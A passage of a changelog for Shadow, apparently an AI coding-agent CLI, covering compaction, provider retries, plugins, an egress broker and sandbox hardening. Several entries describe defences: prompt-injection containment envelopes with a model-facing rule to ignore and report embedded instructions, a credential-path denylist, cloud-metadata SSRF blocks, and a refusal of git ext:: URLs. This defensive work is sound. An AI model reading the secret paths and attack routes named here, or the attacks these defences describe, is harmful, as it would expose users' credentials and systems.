- **Wakeup timers can no longer outlive the process.** Scheduled timers are `unref`'d, and BOTH
  exit paths (headless and TUI) clear any pending wakeup at their single teardown point — a
  queued wakeup can never hold a dying process open or fire into shutdown. Non-finite delays
  (NaN/±Infinity) collapse onto the 30-second floor like negatives already did.
- **SIGINT reaches every live controller.** The single `activeController` slot is replaced by a
  SET of live controllers: a wakeup turn queued behind a running turn used to OVERWRITE the abort
  handle, leaving the running turn uninterruptible.
- **The degraded-compaction warning fires once per episode, not once per turn.** The report is
  consumed on first visibility and resets only on a successful compaction, `/clear`, or a policy
  change — the long tail of turns after one degraded compaction no longer re-warns every turn.
- **Local truncation is two-pass and honest about its stop condition.** Pass one tombstones only
  disposable read-tool results (`read_file`/`grep`/`glob`/`run_shell`/`web_fetch`/`web_search`);
  state-bearing results (agent answers, write outcomes) are taken only if pass one fell short.
  The stop condition is the message COUNT — the one quantity tombstoning can move — and a
  history too short to get under it now reports `failed` visibly instead of returning a silent
  no-op.
- **Sub-agent compaction degradation is no longer silent.** Sub-loops receive the session log,
  and `finding` events now cross the sub-agent bus — deliberately whitelisted (the isolation
  test pins the new set), tagged with the task id so the UI routes them to the panel, never the
  parent's live row.
- **Compaction errors are visible on BOTH paths.** The proactive and overflow-path catches emit a
  finding plus a `compaction_degraded` session-log entry instead of swallowing the throw; the
  stuck state (over trigger, nothing reclaimable) reports `failed` instead of a silent false.
- **Microcompaction no longer overwrites the degradation tombstone** — the truncation sentinel is
  preserved, so an earlier local-truncation marker survives later microcompaction passes.
- **The `compaction` event carries a `degraded` flag** (rendered distinctly in the TUI and the
  headless renderer), and `post_compact` hooks fire only for a real summary — a degraded
  compaction produced none, so it writes none. `/compact` logs `compaction_degraded` for the
  truncated/failed outcomes with a recovery hint.

### Added — v6.12.0 (provider robustness ladder, P2-03)

- **400 param-strip ladder (F01-05).** When a server rejects a streaming request with a 400 whose
  message **names** an optional request param — `stream_options`, `tool_choice`, or
  `temperature` — Shadow retries once with that param stripped and **remembers the rejection for
  the session** on the OpenAI Chat Completions and Responses wires (the Anthropic wire emits none
  of these params): every later request is built without it, so those sessions never pay the same
  400 twice. Attribution, not guessing — a 400 naming nothing strippable stays terminal,
  multiple rejections are walked one 400 at a time, and *value* errors ("temperature 0.2 is below
  the minimum") stay terminal too, so a knob you set explicitly is never silently voided.
  Generalizes the v6.1.0 `tool_choice: "none"` fallback (F11-01), which keeps its specialized
  rung ahead of the generic strip.
- **SSE multi-line frame reassembly (F01-08).** New `src/provider/sse.ts`: one assembler shared
  by the OpenAI, Anthropic, Responses, and MCP-HTTP parsers. One event's `data` field may legally
  span several consecutive `data:` lines (WHATWG SSE); they now join with `\n` and parse as a
  unit — previously such a frame failed JSON.parse and silently vanished. Dispatch is *eager* (a
  frame ships the moment it parses), which keeps NON-conforming servers that skip blank
  separators incremental — nothing buffers until end of stream — and a per-line defensive
  fallback covers packed multi-line payloads too. Hard edges: `data: null` / bare-primitive
  frames are filtered centrally (they used to crash all three provider parsers), a mid-stream
  error flushes the accumulator instead of eating it, a BOM after `data:` parses, and an
  unparseable accumulation is capped at ~1 MB. Nothing that parsed before parses worse now.
- **`COMPAT_MATRIX.md`.** New transport-level compatibility doc: the full ordered 400 recovery
  ladder, the SSE contract (reassembly + line hygiene + tool-argument escaping in both
  directions), `SHADOW_WIRE_API` documented as **Codex-class-only** with the reasoning-drop
  caveat (F01-09), and per-provider notes. Linked from README (Model compatibility) and
  USER_GUIDE (self-hosted temperature).

### Notes

- The self-hosted `temperature` contract (default `1.0`) is unchanged: the ladder only strips
  `temperature` **after a server rejects it** — server-default fallback, never a default reversal.
- `SHADOW_WIRE_API=responses` remains opt-in and documentation-gated: this release wires the
  ladder's session memory into the Responses wire and test-pins its SSE path, but the adapter
  still does not round-trip reasoning items between turns, so it stays scoped to Codex-class
  backends.

### Added — v6.11.0 (plugin manager — local-first, data-only, P3-07)

- **`shadow plugin` — a local-first plugin manager.** A plugin is a folder of **markdown** that
  contributes to the five declarative surfaces Shadow already loads — custom slash commands,
  output styles, skills, sub-agent definitions, workflows — and nothing else. `add <git-url|path>`
  installs **DISABLED** (install ≠ activate); `list` / `enable` / `disable` / `remove` manage the
  lifecycle (`/plugins` does the same in-session). `remove` ARCHIVES to
  `~/.shadow/plugins/.removed/` — it never deletes.
- **The trust model is fail-closed.** Manifests declaring executable surfaces (`hooks`,
  `mcpServers`, `mcp`, `servers`, `scripts`, `bin`, `exec`, `postInstall`) are refused at parse;
  unknown manifest keys are refused (strict schema). Only `.md` files cross the install boundary —
  symlinks, dotfiles, and everything else stay behind — under a 500-file / 8 MB cap enforced by
  `stat` **before** any read (a multi-GB file is refused, never buffered). Provenance is recorded
  per install (`.shadow-plugin-meta.json`): source URL + exact commit for git installs.
- **Git installs are hardened.** Scheme allowlist only (`https://`, `ssh://`, `file://`,
  `git@host:path`) — `ext::` executes commands and is refused, as are `git://`/plain `http://`,
  leading `-` (option injection), and whitespace/control chars. The clone runs with a scrubbed env
  (no ambient secrets), `GIT_TERMINAL_PROMPT=0` (private repos fail fast — clone it yourself and
  `add <path>` if you need auth), shallow, into a 0700 temp dir. `--offline` refuses remote clones
  (local `file://` still works).
- **Loader precedence:** workspace < enabled plugins < your own `~/.shadow` files (commands,
  styles, agent defs — later-wins); skills stay workspace-first-wins. A disabled plugin
  contributes nothing to any surface. Workspace-bundled `.shadow/plugins/` dirs only OFFER
  plugins — nothing is auto-loaded; enablement is global-only by construction.
- **No central catalog — an optional signed index (G3).** Shadow ships with NO plugin registry.
  If you set `pluginIndexUrl` yourself (global-only; a project `shadow.config.json` can never set
  it — both keys join `PROJECT_UNTRUSTED_KEYS`), `shadow plugin search` lists entries and
  `add <name>` resolves a name to its clone URL (which still passes the git allowlist). Index
  fetches flow the egress broker (purpose `plugin-index`, 1 MB **streaming** cap — an oversized
  body is cut mid-stream, never buffered; entries are coerced + display-sanitized incl. bidi
  stripping). Set `pluginIndexKey` (ECDSA P-256 PEM) and the detached signature at `<url>.sig`
  becomes FAIL-CLOSED: tampered body, wrong key, or missing sig refuses the whole index.
- **Honesty layer.** The plugin git clone is a child process, so it bypasses the fetch broker —
  it enforces the offline wall itself and journals its own receipt (purpose `plugin-clone`), keeping
  `shadow egress` complete. `shadow doctor --privacy` discloses both plugin paths (index lookup +
  clone capability, live vs inactive, signed vs UNSIGNED). Every rendered plugin string
  (manifest descriptions/versions, provenance, index URLs) is control-char- and bidi-stripped.
  THREAT_MODEL gains §2 trust rows, §4.13, and Appendix A items (15)–(16).
- **+42 tests** (3 new suites + extensions): install/copy semantics, manifest fail-closed, symlink
  handling, byte/file caps, real `file://` clones with commit provenance, the URL allowlist before
  git runs, offline gate + clone receipts, loader precedence for all five surfaces, index
  coercion/signature fail-closed over a live loopback server, egress receipt rows, project-config
  strip, and privacy-report disclosure.

### Added — v6.10.0 (prompt-injection containment envelopes, P3-05)

- **Containment envelopes for untrusted content (P3-05)** — every tool result that carries bytes
  Shadow does not own (fetched web pages, search snippets, MCP server replies) is now wrapped in a
  structural envelope: a `[UNTRUSTED CONTENT — tool · source]` provenance header, a policy line,
  and collision-resistant `<<<UNTRUSTED_CONTENT_BEGIN>>>` / `<<<UNTRUSTED_CONTENT_END>>>` markers
  around the payload — passed through untouched (for `web_fetch`, after HTML→text reduction; the
  bytes that enter the envelope are never mutated). If the payload itself contains a marker, the
  fence widens (`=` padding) until it no longer collides, so a forged END cannot terminate the
  envelope early; the system-prompt policy teaches the widened-marker rule too.
- **Matching system-prompt policy** — `UNTRUSTED_ENVELOPE_POLICY` joins the harness preamble as
  mechanical glue on every provider and every base-prompt path Shadow assembles (including a
  user-owned `system_prompt.md` and self-hosted profiles), teaching the model to read the markers:
  data, never instructions; disregard and report anything inside that asks to run commands, fetch
  URLs, reveal secrets, or weaken safety. One deliberate exception: a `--system` /
  `system_prompt_path` override replaces the ENTIRE prompt and gets no glue — containment still
  holds there because every envelope carries its own inline policy line (self-describing markers).
- **Truncate-before-envelope** — untrusted payloads are clamped to the loop's `maxToolResultChars`
  budget BEFORE enveloping (`fitPayload`), so every envelope that enters the context is CLOSED —
  the END marker always survives. The two downstream cuts (the loop's `serialize()` and the
  post-compact `trimKeptMessage`) are envelope-safe too: a cut that would sever an envelope drops
  it wholesale instead of leaving it open. Envelope overhead is bounded (header fields sanitized
  + capped), so the fit guarantee is arithmetic, not hope.
- **MCP containment, both transports** — stdio and Streamable-HTTP replies are enveloped on the
  success AND the `isError` path, server JSON-RPC error messages are enveloped too (a new
  `McpServerReplyError` class distinguishes server-authored text from our own transport errors),
  HTTP reply bodies are read-capped at 16 MB (parity with the stdio framing cap; previously
  unbounded), and the unwrapped `data.content` duplicate is gone — MCP payloads used to leak into
  the context twice, the second time without framing. `web_fetch`/`web_search` payloads were never
  duplicated; their `data` now carries metadata only (url/status/type/chars, query/count).
- **Out-of-envelope hygiene** — attacker-authored strings interpolated OUTSIDE the markers are
  sanitized and bounded: HTTP `Location` and `Content-Type` headers, search queries, MCP
  server/tool names in envelope headers. The web console renders long tool summaries in the capped
  scrollable block (they used to render unconstrained), and `/export` caps per-result summaries.
- **Honest limits** (THREAT_MODEL §3.11 + §4.2): containment is framing, not enforcement — the
  approval gate remains the mechanical backstop; MCP tool *descriptions* remain an unwrapped
  surface (ledger F07-12); `describe_media`'s vision duplicate of image bytes is not enveloped
  (known residual). Context-shaping only: zero new egress, no new processes.

### Added — v6.9.0 (sandbox failure policy, P2-12 + P3-04 honesty layer)

- **`sandboxFailurePolicy` (P2-12)** — a global-only config key (`auto` · `fail-closed` · `warn`,
  default `auto`) deciding what happens when the OS sandbox was *requested* but this host has no
  tool to enforce it. `auto` gates every unconfined `run_shell` at the approval gate (suppressible
  by session approvals, allow-rules, and the read-only fast path — like the autonomy floor);
  `fail-closed` joins the denylist tier and **never bends** — every unconfined call asks every
  time; `warn` keeps the pre-P2-12 behavior (no gate, warning folded into the tool result). A
  project's `shadow.config.json` cannot set it (it joins `PROJECT_UNTRUSTED_KEYS`). Explicit
  waivers (`sandbox: "off"`, `--no-sandbox`, `--yolo`, `--autonomy full` at launch) never escalate.
- **Confinement honesty (P3-04)** — Shadow never silently fakes confinement: a startup banner
  names the unconfined state and its policy, `shadow doctor` reports the persistent state
  (`sandbox-policy` check), `doctor --privacy` warns about it, and `/status` shows it live. The
  parallel-execution guard knows about the escalation, so concurrent unconfined calls serialize at
  the gate instead of racing it.
- **Widened credential denylist (F07-06 structural half)** — the sandbox's `SECRET_READ_DENY`
  grows from 7 to 14 entries: `.npmrc`, `.pypirc`, `.git-credentials`, `.config/gcloud`,
  `.azure`, `.config/huggingface`, and `.m2/settings.xml` join `.ssh`, `.aws`, `.gnupg`,
  `.config/gh`, `.netrc`, `.docker/config.json`, and `.kube` as paths no agent-run shell may read.
- **Deferred (P3-04 v1, founder decisions):** Linux landlock enforcement (needs a native syscall
  bridge — no pure-JS/Bun route), the full `$HOME` read-model inversion (breaks legitimate tooling
  reads until the grant model catches up), and the full-autonomy×sandbox gating restructure
  (contradicts the current "full drops jail + grants root" model).

### Added — v6.8.0 (diagnostics feedback loop, P3-06 v0)

- **Diagnostics feedback loop (P3-06 v0):** a `diagnostics` map in `~/.shadow/config.json` maps a
  file extension to a command (`{ "ts": "tsc --noEmit", "py": "ruff check {file}" }`). After every
  **successful** `write_file` / `edit_file` / `multi_edit`, the mapped command runs and its output
  is folded into the tool result — the model sees compiler/linter verdicts in-loop and
  self-corrects on the next turn instead of finding out at test time. `{file}` is substituted
  shell-quoted; clean-and-silent runs fold nothing (zero context cost); output is capped
  (head+tail); each run has a 30 s timeout that is reported, never silent. Map keys are
  normalized (`ts` / `TS` / `.ts` all match).
- The diagnostics runner is adversarially hard-capped: each command runs in its own process group
  and gets SIGTERM at the deadline, escalating to SIGKILL — a hang-proof or daemon-spawning
  diagnostic can never wedge the turn; an external kill is labeled honestly, never as a timeout.
  Identical concurrent commands (parallel writes, one `tsc --noEmit`) share a single run. On
  Windows, a filename with shell-active characters is skipped with an advisory instead of being
  spawned on a quoting guess.
- Security posture mirrors hooks: `diagnostics` is honored only from the **trusted global** config
  (it joins `PROJECT_UNTRUSTED_KEYS` — a cloned repo cannot ship commands that run on your
  machine), runs with the scrubbed env allowlist (provider keys never inherited), workspace cwd,
  and empty stdin. Diagnostics are advisory — they never change the write's success status.

### Added — v6.7.0 (egress broker, P2-01 + P2-02.1)

- **The egress broker — one chokepoint for every byte that leaves the machine** (P2-01, flagship G3
  item): every outbound HTTP request Shadow makes now flows through `shadowFetch()`
  (`src/safety/egress.ts`). Each request passes an offline wall, an SSRF policy tier (model-authored
  URLs get the full netguard; operator-configured endpoints get the cloud-metadata block, so your own
  LAN serves stay reachable), and DNS pinning to the validated IP **set** — provider failover across
  multi-A records survives, DNS rebinding doesn't.
- **The runtime receipt** (G3: "zero telemetry, demonstrable in one command"): every allow/deny
  decision is journaled to `~/.shadow/egress.log` (JSON lines, 0600, rotated at 256 KiB).
  **`shadow egress`** prints it from a fresh process; **`/connections`** shows the live session
  aggregate in the TUI (host · allowed/denied counts · purposes · last seen).
- **`shadow egress`** subcommand + **`/connections`** slash command (see above).

### Changed — v6.7.0

- **Every Node-side egress site rewired through the broker:** provider stream (both paths), Anthropic
  count_tokens, MCP Streamable-HTTP, the update check + `shadow update` binary download, OAuth
  scaffold, vision endpoint, remote image fetch, web_fetch/web_search, and the local gguf/mlx/vllm
  probes (journaled as `local-probe`). THREAT_MODEL.md Appendix A re-verified line-by-line (v6.7.0).

### Security — v6.7.0

- **`--offline` is now a fetch-layer invariant, not a per-caller convention** — per runtime: on
  **Node** the enforcing egress agent is the process-wide undici dispatcher; in the **Bun binary**
  the offline wall wraps `globalThis.fetch`. Either way even code that bypasses `shadowFetch()` is
  refused before dial, and non-local hostnames must resolve to verifiably-local IPs. Neither wall
  covers third-party non-`fetch` transports (direct `node:http`, Bun-native sockets) — the lint
  guard, the host snapshot test, and the OS sandbox are the layers for those. The wall is armed in
  bootstrap before anything can touch the network.
- **Host snapshot guard** (P2-02.1): the no-telemetry test now pins the exact snapshot of hardcoded
  remote hosts in `src/` and caps raw `fetch()` call sites at exactly two (the broker + one inline
  browser template). Any new egress destination fails the build with the deliberate-review prompt
  (THREAT_MODEL row + `doctor --privacy` update) before it may ship.
- **Lint guard:** raw `fetch()` calls, fetch aliasing, `globalThis.fetch` reads (dot or bracket),
  undici imports (static, dynamic, or `require`) outside the broker fail `eslint` — and the
  "no new raw fetch" rule is itself test-guarded against the sneaky shapes.
- **MCP HTTP is bounded** (P2-01 step 6): per-RPC deadline + caller abort signal — a wedged MCP
  endpoint can no longer hold a turn open, and ESC reaches MCP HTTP calls.
- `doctor --privacy` telemetry row now states the broker + receipt.

### Fixed — v6.7.0

Findings from the adversarial pre-commit review (20-agent find→verify workflow; all confirmed
against the code, all fixed in this release):

- **Cloud-metadata block now covers every spelling:** `169.254.169.254` in IPv4-mapped,
  IPv4-compat, NAT64, 6to4, and Teredo v6 encodings, plus AWS IMDSv6 `fd00:ec2::254` — which sat
  inside fc00::/7 ULA and was classified *local* (admitted under `--offline`) before this.
- **The metadata tier fails closed:** an unresolvable name can no longer proceed unpinned — empty
  resolution is a deny, and the 30s negative DNS cache (a validation-free window in which an
  unbudgeted socket-layer lookup could reach IMDS) is gone.
- **`--offline` verifies hostname resolution:** a hostname must resolve to IPs that are
  *verifiably* local; a spoofed `*.local`/mDNS name answering with a public IP is refused (before:
  admitted on the name alone).
- **Cross-host redirects no longer dial the original host's pins:** the pinned lookup falls back to
  real DNS for any hostname other than the validated one (before: a redirect to a second host was
  dialed at the first host's validated IPs); netguard-tier traffic forces `redirect: 'manual'` and
  re-validates each hop itself.
- **Localhost serves bound to `::1` only stay reachable** — the pin set no longer hardcodes
  `127.0.0.1` for `localhost` (uvicorn-style `--host localhost` serves were unreachable).
- **Receipt writer is bounded:** capped pending-write queue (drop-on-overflow with a dropped-line
  counter) and a stall deadline that detaches a wedged write chain — a slow disk can no longer grow
  unbounded memory.
- **The pinned-agent cache is LRU-capped** (64 agents, oldest closed on eviction) — a long browsing
  session across many hosts can no longer accumulate agents without bound.

### Added

- **Microcompaction** (P1B-02): Shadow now clears stale, cheaply-reproducible tool-result bodies
  (read_file/grep/glob/run_shell/web_*) in place — replacing them with a sentinel while keeping
  every block's id and position intact — once context passes ~70% full, before the expensive
  summarizer round-trip fires at ~90%. The cheapest context win for long self-hosted sessions. On
  by default (`microcompact`); the positional tool-result healer stays correct (its tests are green).
- **Custom output styles** (F08-12): drop a `*.md` in `.shadow/output-styles/` or
  `.claude/output-styles/` (workspace or `~`) to add a named `/style` whose body is appended to the
  system prompt, alongside the four built-ins. Jailed/capped/symlink-safe; global wins on collision.
- **External editor** (F08-10): `Ctrl-X Ctrl-E` opens the current draft in `$VISUAL`/`$EDITOR`
  (idle only). Ink leaves raw mode while the editor owns the terminal, then re-enters; the edited
  text becomes the composer content.
- **"While you were away" resume recap** (F08-11): opt-in (`resumeRecap`); on `/resume` Shadow asks
  your current provider for a short summary of the restored conversation and shows it boxed. One
  non-streaming call to your own endpoint, silent on any error, and it never starts a real turn.

### Changed

- **Session logs are dramatically lighter and startup is far faster** (P1B-06/07): the session log
  no longer records a line per streamed token/shell-chunk (a 100-token turn wrote ~100 synchronous
  file appends; now it's O(1) — the transcript reconstructs from the committed turn records), and
  writes go through one persistent file descriptor instead of open-write-close per event. Startup no
  longer parses every session log twice: the latest snapshot is found by a backward tail-scan and a
  per-session manifest (mtime-invalidated) answers listing/count without re-reading — the fix for a
  machine with 1,200+ session logs that used to parse hundreds of megabytes on every launch.

- **@-file references** (F08-04): type `@` in the composer to fuzzy-pick a workspace file (Tab or
  Enter inserts the path); on submit, each referenced file's content is inlined for the model —
  capped per-file and in total — so it doesn't need a `read_file` round-trip. Your on-screen echo
  still shows the clean `@path`, not the file dump. The picker walks the workspace lazily (cached,
  bounded, skipping node_modules/.git/build/hidden), and an `@path` that escapes the jail or doesn't
  resolve is left as ordinary text.
- **Kimi / Moonshot support** (F10-08): a Moonshot AI (Kimi) onboarding preset
  (`api.moonshot.ai/v1`, default `kimi-k2-thinking`), a kimi family profile that replays a
  thinking model's `reasoning_content` across tool turns (so tool loops keep the model's reasoning,
  like the Qwen path) and declares a low/high/max effort scale, and a "Moonshot" `/model` picker
  group. Kimi's `<|kimi_image_placeholder|>` control token was already guarded.

### Fixed

- **DeepSeek no longer wastes 3 round-trips per turn on the output cap** (F09-06): the static
  65,536 default `max_tokens` exceeds `deepseek-chat`'s 8,192 limit, so every turn used to 400 and
  walk the shrink ladder (65536→32768→16384→8192) before succeeding. A deepseek family profile now
  caps the first request to the model's real limit (8,192 for chat; 65,536 for the reasoner's
  larger thinking+answer budget), so it fits on the first try. The shrink ladder stays as the
  safety net for anything unprofiled.

### Added

- **Background sub-agents can be cancelled** (F10-02, completed): a background agent that keeps
  running after its launching turn was visible but unstoppable. `/agents` now lists the agents
  running right now (type · id · current tool) alongside the definitions, and `/agents kill <id>`
  (or `/agents kill all`) cancels a background agent — it stops at its next boundary and reports as
  cancelled, with the outcome delivered as a task-notification. Cancellation rides a bus request the
  running agent listens for, so no session-wide registry plumbing.
- **Terminal notifications on long turns / waiting approvals** (P1B-04): when a turn runs longer
  than ~20s or an approval sits unanswered for ~12s, Shadow raises a terminal notification so you
  can tab away during a slow self-hosted run and be called back. `notify: auto` (default) uses your
  terminal's native desktop notification (iTerm2 / kitty / ghostty) and falls back to the bell
  elsewhere; force a channel or set `notify: off`. Local terminal escape only — never fires into a
  pipe, nothing leaves the machine. A `stop`-hook example is documented for custom notifiers.
- **Custom slash commands** (F10-07): drop a `*.md` file in `.shadow/commands/` or `.claude/commands/`
  (workspace or `~`) and it becomes a `/<name>` command whose body is a prompt template with
  `$ARGUMENTS` / `$1`…`$9` substitution — so teams share a command library in the repo and Claude
  Code users can port theirs unchanged. Built-in commands always win (a repo can't hijack `/clear`),
  the loader is jailed/capped/symlink-safe like the skills loader, and global (`~`) commands beat a
  same-named workspace one.

### Changed

- **Approval dialogs now show a diff, not a one-liner** (F10-04): edit / write / multi-edit /
  apply_patch approvals render the actual change — additions green, deletions red, context dim, with
  a `+N −M` stat line — bounded to ~20 lines with a "+N more" marker, matching the committed-result
  diff style. New-file writes show as all-additions; a patch renders with its own +/- coloring. You
  no longer approve file changes blind. Non-file tools keep their one-line preview.
- **`/cost` reports true session totals** (P1B-03 / F02-01): the readout summed nothing — it showed
  only the last turn but labeled it "(session)". It now accumulates tokens (and cost) across every
  turn and sub-agent, prints a session line (with turn count) plus a separate last-turn line, and
  resets on `/clear`.

- **Sub-agents are now fully visible while they run** (BUG 3 depth + F10-02): the live panel shows
  each delegated agent's type (color-coded), description, current tool, running tool-use count and
  token scale — mirroring Claude Code's agent progress lines — as a grouped "Running N agents…"
  tree that degrades to a one-line summary in a tight terminal. A **background** agent no longer
  vanishes the moment its launching turn ends: it stays in the panel through completion (shown as
  Done/failed) and clears on your next message. The web console and headless renderer now attribute
  sub-agent tool activity too (no more "unhandled event" noise; delegated tools are tagged with
  their agent), and `subagent_usage` carries the taskId + token counts so spend maps to the right
  agent. Verified live against a self-hosted Qwen serve.
- **Self-hosted serves without tool-parser flags now work** (F11-01): a vLLM/SGLang endpoint
  started without `--enable-auto-tool-choice` / `--tool-call-parser` rejects `tool_choice:"auto"`
  with a 400 — which used to kill every agentic request on turn 1. Shadow now retries once with
  `tool_choice:"none"` (the tools still render in the prompt, a tool-trained model emits calls as
  text, and Shadow's text-tool-call recovery executes them), and remembers the endpoint's
  limitation for the session so later turns skip the wasted 400. A clear doctor-style hint names the
  exact vLLM/SGLang flags if native tool-calling is still needed. Verified live: an agentic run and
  a sub-agent delegation both complete end-to-end against a serve with no tool parser configured.

## [6.0.0] - 2026-08-09

### Added

- **Live steering mid-turn** (P0-1): you can now type a message and press Enter while the agent is
  still working. Shadow interrupts the model stream, lets any tool call already in flight finish,
  cleanly skips tool calls that hadn't started yet (recording each as "skipped — user sent a new
  message"), and immediately continues with your new message instead of making you wait for the turn
  to end. Slash commands and scheduled wake-ups still wait for a safe turn boundary.
- **Positional tool-result re-pairing for Qwen/Hermes templates** (P0-1): when a model emits tool
  results out of order, with gaps, or duplicated, Shadow now heals the pairing positionally so the
  conversation history stays coherent instead of corrupting the turn.
- **Per-endpoint stream resilience knobs** (`idleTimeoutMs` / `firstByteTimeoutMs` / `streamRetries`)
  on model entries (P1A-04): the stream idle watchdog was a hard-coded 120s compile-time const with no
  per-endpoint escape. Self-hosted inference servers (llama.cpp / vLLM / MLX / SGLang) routinely pause
  for tens of seconds between SSE chunks — long generation, deep prefill, queueing — far past Shadow's
  tight public-API watchdog, and vLLM/SGLang send no SSE keepalives during prefill, so a big-context
  Qwen 3.8 Max turn can exceed 120s before its first token. An operator can now raise the frame per
  endpoint via config, or raise/override it process-wide with the `SHADOW_IDLE_MS` env escape hatch
  (env > config > 120s default; the env is validated `^\d+$` and ignored if bogus — fail-closed).
- **First-byte watchdog hop** (P1A-04): `firstByteTimeoutMs` now applies ONLY to the first chunk of a
  brand-new stream, then hands off to the steady-state frame on the first byte; it previously persisted
  per-chunk, so a tight first-byte budget silently re-tripped mid-stream.
- **Headers-first self-hosted rescue tagging** (P1A-04): a mid-stream stall with `emitted === 0`
  against a self-hosted endpoint is now tagged `idle` instead of `empty`, so the C4 no-re-POST
  protection fires — Shadow will NOT re-fire the identical prompt at a busy local serve that already
  accepted it through headers-first streaming (vLLM/SGLang flush 200 + headers before prefill
  completes). Public endpoints keep the existing mid-stream re-POST rescue.
- **Explicit `selfHosted` opt-in on the Anthropic adapter** (P1A-04): a remote Anthropic-compatible
  proxy can be flagged self-hosted so the C4 no-re-POST bail-out triggers for it too (mirrors
  OpenAIProvider).

### Added

- **Self-hosted Qwen 3.8 Max onboarding preset** (P1A-06 step 4): the server door of onboarding
  (terminal AND browser) now offers "Self-hosted Qwen 3.8 Max (vLLM/SGLang)", which persists a
  ModelEntry carrying the full declared wire contract out of the box — the capability block
  (preserve_thinking, interleaved reasoning, low/medium/xhigh effort scale, 262,144-token output
  floor) plus a 600s stream idle frame for keepalive-less prefill. Presets can now ship ModelEntry
  contract extras generally (`PresetEntryExtras`), so an aliased `--served-model-name` serve gets
  the frontier contract without hand-editing config.

### Fixed

- **`typecheck:all` is clean again** (P1-GATE prep): cleared the legacy strict-config baseline that
  had accumulated in test files — capability-block literals in the Qwen contract tests now narrow to
  the `ModelCapabilities` union, and the per-config-knobs stream tests use the real `fetch` input
  type, a non-null abort signal, block-array message content, and an explicit model id.
- **Bracketed paste can no longer approve a permission dialog or lock up input** (P1A-14): a paste
  into an open approval dialog had its start marker swallowed by the dialog and its content —
  including newlines that parsed as Enter — routed into the decision path, so a paste could approve
  the pending call; a multi-chunk paste whose end marker arrived after the dialog closed could
  strand input permanently. Bracketed paste is now handled as a transport above every modal owner:
  the completed paste always lands in the composer draft, never resolves a modal, and paste state
  is reset whenever a dialog opens so it can't strand across a modal edge.
- **Live-steering focus collisions fixed** (P1A-15): starting a turn from vim NORMAL no longer
  strands the composer there (every turn start returns it to INSERT); reverse-search (Ctrl-R) can
  no longer open mid-turn and capture the Esc/Enter you need to interrupt or steer; and an Enter
  landing in the brief dialog-arm window now steers instead of denying a gate you have not seen.
- **Offline mode tells the truth about egress enforcement** (P1A-16): the offline system prompt
  claimed run_shell network egress is denied, which only holds when an OS sandbox (bwrap/seatbelt)
  is actually confining. When confinement is unavailable the prompt now says egress cannot be
  enforced on this host, and a startup warning is shown — the no-network contract is honest about
  who is holding it.
- **`doctor --privacy` now reports every egress source** (P1A-17): the exhaustive list gained the
  vision endpoint (base64 image upload), first-serve HuggingFace weight downloads for repo-id
  presets, configured hooks/statusLine shell (which can make their own network calls), and the
  npm-registry fetch a browser-MCP `npx` preset performs on first connect. THREAT_MODEL §3.10 now
  names MCP. The over-reporting promise holds again.
- **Repeated hallucinated tool names hit the loop guard** (P1A-18): a model that called the same
  unknown tool name over and over previously ran to the 200-iteration ceiling — a token furnace on
  a fresh serve. The third consecutive identical unknown-tool call now stops the run with a message
  listing the actually-registered tool names.
- **The web console renders code fences with the same width-correct rule as the TUI** (P1A-13
  close-out/F10-10): the terminal renderer learned the CommonMark rule (a closing fence must be at
  least as wide as its opener) but the web console's generated vendor parser was never
  regenerated, so the two surfaces disagreed on 4-tick fences containing 3-tick lines. Vendor +
  bundled assets regenerated from the single shared implementation.
- **Long fenced answers can no longer freeze the TUI on fast self-hosted streams** (P1A-11): the
  held tool-intent suffix was already capped, but a never-closing NON-tool code fence
  (```` ```python ```` from a chatty or malformed model) is invisible to that cap — the retained
  live remainder grew with the stream and every token re-parsed it, going quadratic exactly on
  fast local serves. The remainder is now capped too (64KB): overflow is force-committed to native
  scrollback with fence continuity preserved (the committed half is closed and the live half
  re-opened with the original marker/width/language), so per-token work is bounded by the caps —
  never the stream — and no byte is ever dropped. Pinned by a 200KB open-fence load test with a
  content-exact fidelity oracle, an instrumented per-delta work bound, and a real-component run
  asserting the burst coalesces into a handful of paints (~19 frames for ~3,000 deltas).
- **Empty-response failures are diagnosed honestly** (P1A-08): after three empty responses Shadow
  no longer tells you to "check the configured model name and endpoint" (the endpoint answered —
  that was a misdiagnosis). A known reasoning model, or any model whose previous turn stopped at
  the output-token cap, is now diagnosed as a starved output budget with the concrete fix named
  (raise `maxOutputTokens` / lower `/effort`); other models get a served-model-id steer.
- **Nameless tool-call retries show an honest HUD label** (P1A-07): the retry line now says
  "tool call missing its name" instead of the misleading "malformed tool-call JSON", and the
  mixed-turn property is pinned by test: one nameless call alongside two valid siblings executes
  the valid pair and feeds only the broken one back.
- **The alias-reasoning startup warning no longer fires for every self-hosted model** (P1A-10
  re-scope): llama/mistral/gemma operators saw a spurious Qwen reasoning-replay warning at every
  session start. The warning is now scoped to Qwen-looking ids that fail the replay regex, and its
  text spells out the complete capability block (including `maxOutputTokens: 262144`).
- **A capability block declaring only `preserveThinking: true` now yields one consistent wire
  state** (A3a/F10-06): the replay gate accepted the lone field (and replayed reasoning history)
  while the request-shaping gate also demanded a `reasoning` declaration before sending
  `preserve_thinking` — so the endpoint saw replayed thinking it was never told to preserve. One
  declared field now activates both sides together, and the alias-ambiguity startup warning spells
  out the full recommended block (including the `maxOutputTokens` needed for the 262k floor).
- **Live model switches no longer shed the endpoint's stream contract** (A2/F10-01, critical):
  switching models inside the TUI (`/model`), the in-TUI fallback path, `/model test`, and the
  headless `doctor model` probe all rebuilt the provider WITHOUT the per-entry
  `idleTimeoutMs`/`firstByteTimeoutMs`/`streamRetries` knobs and the declarative capability
  block — silently reverting the 120s idle watchdog and the self-hosted contract mid-session,
  in the exact interactive flow a self-hosted operator uses. All provider constructions from a
  ModelEntry now spread one shared `entryStreamContract()` helper (env > config precedence
  included), pinned by a drift test that counts call sites.
- **Empty-response retry backoff is now abort-aware and test-injectable everywhere** (A1/F10-09):
  the new empty-response backoff (100/250ms) blocked on a plain timer, so a Ctrl-C landing during
  the wait was only honored after the timer expired, and a background sub-agent whose model
  returned empty responses delivered its completion notification ~350ms later than the
  notification-buffering test's window — the suite's only red test. Backoff now resolves
  immediately on the turn's abort signal, skips zero-length waits, and the affected test drives
  the injectable `sleep` seam (the T0-6 buffering contract itself was never broken; verified by
  a timing probe before the fix).
- **Lint gate restored to green** (A1): one `prefer-const` error and seven unused-import/variable
  warnings introduced by uncommitted work (`src/config.ts`, three new stream test files) removed;
  `npx eslint .` exits 0 again.
- **Text-embedded tool-call parser hardening** (P0-1): streaming display now reliably distinguishes
  visible text from tool-call payloads written as plain text (bare JSON, ```` ```json ```` fences,
  Hermes/Qwen `<function=…>` forms, and DeepSeek control tokens), so partial tool calls no longer
